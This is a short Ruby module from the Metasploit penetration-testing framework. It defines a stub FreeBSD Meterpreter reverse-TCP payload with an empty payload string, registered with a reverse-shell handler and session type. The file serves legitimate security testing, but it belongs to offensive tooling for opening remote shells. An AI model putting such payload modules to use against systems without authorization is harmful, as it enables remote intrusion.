##
# $Id: metsvc_reverse_tcp.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_x86_bsd'
require 'msf/base/sessions/meterpreter_options'

module Metasploit3

	include Msf::Payload::Bsd
	include Msf::Payload::Single
	include Msf::Sessions::MeterpreterOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'FreeBSD Meterpreter Service, Reverse TCP Inline',
			'Version'       => '$Revision: 9179 $',
			'Description'   => 'Stub payload for interacting with a Meterpreter Service',
			'Author'        => 'hdm',
			'License'       => BSD_LICENSE,
			'Platform'      => 'bsd',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::Meterpreter_x86_BSD,
			'Payload'       =>
				{
					'Offsets' => {},
					'Payload' => ""
				}
			))
	end

end
